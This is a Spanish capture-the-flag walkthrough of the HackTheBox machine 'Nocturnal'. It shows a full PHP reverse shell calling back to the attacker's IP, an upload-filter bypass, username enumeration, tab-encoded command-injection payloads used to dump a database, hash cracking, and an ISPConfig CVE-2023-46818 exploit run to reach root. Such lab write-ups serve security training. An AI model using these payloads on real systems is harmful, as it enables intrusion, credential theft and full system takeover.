
# Nocturnal

<figure><img src="/files/l9fXdQpkvl1zyaWmW9vL" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Nocturnal`
* **IP:** `10.10.11.64`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `27/05/2025`

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

***

## <mark style="color:purple;">Escaneo de Puertos</mark>

```bash
sudo nmap -v -sV -T5 10.10.11.64
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Observaciones: Solo encontramos puertos comunes abiertos. Nos interesa la aplicación web.

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

### Acceso Web

Accedemos a `http://nocturnal.htb` y observamos que parece ser una plataforma donde podemos subir archivos word, excel y PDF.

<figure><img src="/files/lOU0m6FBv0BtUOdfpjJJ" alt=""><figcaption></figcaption></figure>

Encontramos las páginas de login y registro, por lo que vamos a registrarnos para ver el interior de la aplicación:

<figure><img src="/files/EIyj9dibk59VLAEsUwlA" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Prueba de subida de archivos</mark>

A simple vista lo primero que se nos ocurre es subir una shell php para ganar acceso. Usaremos la siguiente reverse shell:

{% code title="shell.php" %}

```php
<?php
$ip = '10.10.14.112';
$port = 4444;

$sock = fsockopen($ip, $port);
if (!$sock) {
    exit(1);
}

$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);
if (!is_resource($process)) {
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
    $read = array($sock, $pipes[1], $pipes[2]);
    $write = NULL;
    $except = NULL;

    if (stream_select($read, $write, $except, NULL) === false) {
        break;
    }

    foreach ($read as $stream) {
        if ($stream == $sock) {
            $input = fread($sock, 1024);
            fwrite($pipes[0], $input);
        } else if ($stream == $pipes[1]) {
            $output = fread($pipes[1], 1024);
            fwrite($sock, $output);
        } else if ($stream == $pipes[2]) {
            $error = fread($pipes[2], 1024);
            fwrite($sock, $error);
        }
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```

{% endcode %}

Al darle a upload vemos que tiene algún tipo de validación:

```
Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.
```

<figure><img src="/files/3o80GevqyLxGnbzx3aNw" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Bypass con doble extensión</mark>

Vamos a renombrar la `shell.php` a `shell.php.pdf` y probar si podemos bypassear el filtro:

<figure><img src="/files/4ohOZN06DXinWAzpHeeI" alt=""><figcaption></figcaption></figure>

Parece que podemos subirlo sin problema. Vamos a darle a Forward y vemos que se sube correctamente:

<figure><img src="/files/eKNU7FcRdWfHYUMkP8D3" alt=""><figcaption></figcaption></figure>

Al pulsar sobre el archivo se nos descarga un PDF y al abrirlo no nos deja ver el php:

<figure><img src="/files/FxpTR7lPqZa2JiGJL9qt" alt=""><figcaption></figcaption></figure>

Al subir un PDF válido pasa lo mismo, solamente nos descarga lo que subamos en nuestro equipo.

***

## <mark style="color:purple;">Enumeración Web</mark>

### Fuzzing de Directorios

<pre class="language-bash"><code class="lang-bash"><strong>dirsearch -u http://nocturnal.htb -x 404
</strong>
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/htb/nocturnal/reports/http_nocturnal.htb/_25-05-22_17-09-37.txt

Target: http://nocturnal.htb/

[17:09:37] Starting: 
[17:09:49] 302 -    0B  - /admin.php  ->  login.php
[17:10:01] 301 -  178B  - /backups  ->  http://nocturnal.htb/backups/
[17:10:01] 403 -  564B  - /backups/
[17:10:07] 302 -    0B  - /dashboard.php  ->  login.php
[17:10:19] 200 -  644B  - /login.php
[17:10:20] 302 -    0B  - /logout.php  ->  login.php
[17:10:30] 200 -  649B  - /register.php
[17:10:39] 403 -  564B  - /uploads
[17:10:39] 403 -  564B  - /uploads/dump.sql
[17:10:39] 403 -  564B  - /uploads/
[17:10:39] 403 -  564B  - /uploads/affwp-debug.log
[17:10:39] 403 -  564B  - /uploads_admin
[17:10:41] 302 -    3KB - /view.php  ->  login.php

Task Completed
</code></pre>

**Directorios encontrados:**

* `/backups` - No podemos acceder
* `/uploads` - No podemos acceder

No se encuentran datos sensibles directamente accesibles.

### Fuzzing de usuarios

Como vimos en Burp Suite al pulsar en un archivo subido vemos que le pasa el parámetro username, por lo que vamos a fuzzearlo para intentar obtener otros usuarios de la web:

```html
GET /view.php?username=afsh4ck&file=shell.php.pdf HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Referer: http://nocturnal.htb/dashboard.php
Cookie: PHPSESSID=348h8abmi9682ufu5ikmbinf2c
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

#### Fuzzing con ffuf

```bash
ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=shell.php.pdf" \
     -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
     -H "Cookie: PHPSESSID=348h8abmi9682ufu5ikmbinf2c" \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
     -mc 200 \
     -fr "User not found" \
     -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=shell.php.pdf
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=348h8abmi9682ufu5ikmbinf2c
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Regexp: User not found
________________________________________________

[Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 59ms]
| URL | http://nocturnal.htb/view.php?username=admin&file=shell.php.pdf
    * FUZZ: admin

[Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 37ms]
| URL | http://nocturnal.htb/view.php?username=amanda&file=shell.php.pdf
    * FUZZ: amanda

[Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 41ms]
| URL | http://nocturnal.htb/view.php?username=tobias&file=shell.php.pdf
    * FUZZ: tobias
```

Encontramos 3 usuarios!

* `admin`
* `amanda`
* `tobías`

***

## <mark style="color:purple;">Impersonar usuarios</mark>

Vamos a usar Burp Suite para impersonar a los usuarios que hemos encontrado, a ver si han subido algún archivo interesante:

<figure><img src="/files/0ouaL22YFpUv6l9BEl7v" alt=""><figcaption></figcaption></figure>

Conseguimos impersonarnos correctamente con el usuario amanda y vemos que ha subido un documento `privacy.odt` muy interesante. Vamos a descargarlo:

<figure><img src="/files/9Pm22m7OPoLj1YxD78wE" alt=""><figcaption></figcaption></figure>

En `content.xml` encontramos la contraseña del usuario amanda:

<figure><img src="/files/CxdBacrffihg9yUtCdNK" alt=""><figcaption></figcaption></figure>

```
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J
```

La probamos por SSH pero no nos funciona. Vamos a probarla accediendo al servicio web:

<figure><img src="/files/HEzn3fTRxD3n2kSTzRFb" alt=""><figcaption></figcaption></figure>

Se nos ha habilitado la opción de Admin Panel, vamos a echarle un ojo:

<figure><img src="/files/3ot4rYn1Gvx2IwwsyBAr" alt=""><figcaption></figcaption></figure>

Este admin panel nos permite seleccionar un archivo y visualizarlo en la parte inferior. Vemos que hay una sección de backups interesante.

Seleccionando por ejemplo la de `register.php` encontramos la ubicación de la base de datos:

```php
<?php
session_start();
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
```

Eso nos indica que está en la ruta:

```
/var/www/nocturnal_database/nocturnal_database.db
```

## <mark style="color:purple;">Command Injection</mark>

En la parte de abajo del todo de la página encontramos un input que podría ser vulnerable:

<figure><img src="/files/9vJvuHfnmoLfSALQdVbV" alt=""><figcaption></figcaption></figure>

Al inyectar payloads en bash en el campo de contraseña utilizando codificación de URL, confirmamos RCE con comandos como:

```bash
%09bash%09-c%09"whoami"%09
```

Una cosa importante que aprendí durante esta etapa fue que, aunque los caracteres especiales obvios estaban bloqueados, los espacios en blanco codificados en URL como `%09`(tabulación) aún podían usarse para eludir el filtro e inyectar comandos con éxito.

<figure><img src="/files/YuLCkJxJVMkioIlhAtAu" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Lectura de la base de datos</mark>

Volcamos la base de datos SQLite usando Burpsuite como se muestra a continuación. Primero hacemos un `ls` para confirmar la presencia de la base de datos:

```bash
%09bash%09-c%09"ls%09/var/www/nocturnal_database/"%09
```

<figure><img src="/files/vpdVfOf8HKCz0qrQGJce" alt=""><figcaption></figcaption></figure>

### Dumpear base de datos

Usaremos el siguiente payload:

```bash
password=%09bash%09-c%09"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"%09&backup=
```

<figure><img src="/files/NpZKKtp5wE1f1NHOgR9D" alt=""><figcaption></figcaption></figure>

Tenemos los hashes de todos los usuarios! Vamos a guardarlos en un archivo de texto y a intentar crackearlos:

```
INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda');
INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db');
INSERT INTO users VALUES(8,'test','60474c9c10d7142b7508ce7a50acf414');
INSERT INTO users VALUES(9,'lalala','9aa6e5f2256c17d2d430b100032b997c');
INSERT INTO users VALUES(10,'123','202cb962ac59075b964b07152d234b70');
```

### Cracking con hashcat

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.2.6) starting

9aa6e5f2256c17d2d430b100032b997c:lalala                   
202cb962ac59075b964b07152d234b70:123                      
60474c9c10d7142b7508ce7a50acf414:test12                   
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
<---SNIP--->
```

Encontramos una contraseña que coincide con el hash del usuario tobias: `slowmotionapocalypse`

***

## <mark style="color:purple;">User Flag</mark>

```bash
ssh tobias@nocturnal.htb

The authenticity of host 'nocturnal.htb (10.10.11.64)' can't be established.
ED25519 key fingerprint is SHA256:rpVMGW27qcXKI/SxVXhvpF6Qi8BorsH7RNh1jzi8VYc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nocturnal.htb' (ED25519) to the list of known hosts.
tobias@nocturnal.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)

Last login: Mon May 26 15:05:03 2025 from 10.10.15.28

tobias@nocturnal:~$ ls
user.txt

tobias@nocturnal:~$ cat user.txt
75738eaf7157760209eb3f8a7********
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No podemos ejecutar sudo en la máquina:

```bash
tobias@nocturnal:~$ sudo -l

Sorry, user tobias may not run sudo on nocturnal.
```

### Etc/passwd

```bash
tobias@nocturnal:/bin$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
ispapps:x:1001:1002::/var/www/apps:/bin/sh
ispconfig:x:1002:1003::/usr/local/ispconfig:/bin/sh
smmta:x:115:120:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:116:121:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
```

## <mark style="color:purple;">Linpeas</mark>

Encontramos 4 usuarios con shell:

```
root:x:0:0:root:/root:/bin/bash
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
ispapps:x:1001:1002::/var/www/apps:/bin/sh
ispconfig:x:1002:1003::/usr/local/ispconfig:/bin/sh
```

Ejecutamos Linpeas y vemos puntos interesantes.

### Servicios corriendo

Encontramos varios servicios corriendo internamente, entre los que nos llama la atención el puerto 8080, que suele identificarse con servicios web expuestos:

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

Vamos a configurar el pivoting SSH para acceder desde nuestro Kali:

```bash
ssh -L 8081:127.0.0.1:8080 tobias@10.10.11.64
```

Ahora accedemos a través del navegador en `http://127.0.0.1:8080` y llegamos a un panel de login de ISP Config.&#x20;

<figure><img src="/files/D4fZYxLDwGVn3gQD10Dc" alt=""><figcaption></figcaption></figure>

#### Prueba de contraseñas

Probando distintas contraseñas descubrí que el usuario `admin` usa la misma contraseña que `tobias` para acceder a través del login web:

<figure><img src="/files/yq7c8JorQPq5U9HmYbwV" alt=""><figcaption></figcaption></figure>

#### Versión

<figure><img src="/files/AZedzK0vJcwXtiP5QjnD" alt=""><figcaption></figcaption></figure>

Después de verificar la versión, investigué las vulnerabilidades y encontré un exploit conocido (**`CVE-2023–46818`**), que permitía a los usuarios autenticados lograr la ejecución remota de código.

{% embed url="<https://github.com/ajdumanhug/CVE-2023-46818>" %}

```bash
python3 CVE-2023-46818.py http://127.0.0.1:8081 admin slowmotionapocalypse

[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_46dff2cd669587a61a057534
[+] CSRF Key: 90dcb44275c630680d183a73b341caca8bec5d11
[+] Injecting shell payload...
[+] Shell written to: http://127.0.0.1:8081/admin/sh.php
[+] Launching shell...

ispconfig-shell# whoami
root

ispconfig-shell# cat /root/root.txt
f4135314d76e357742e2a7************
```
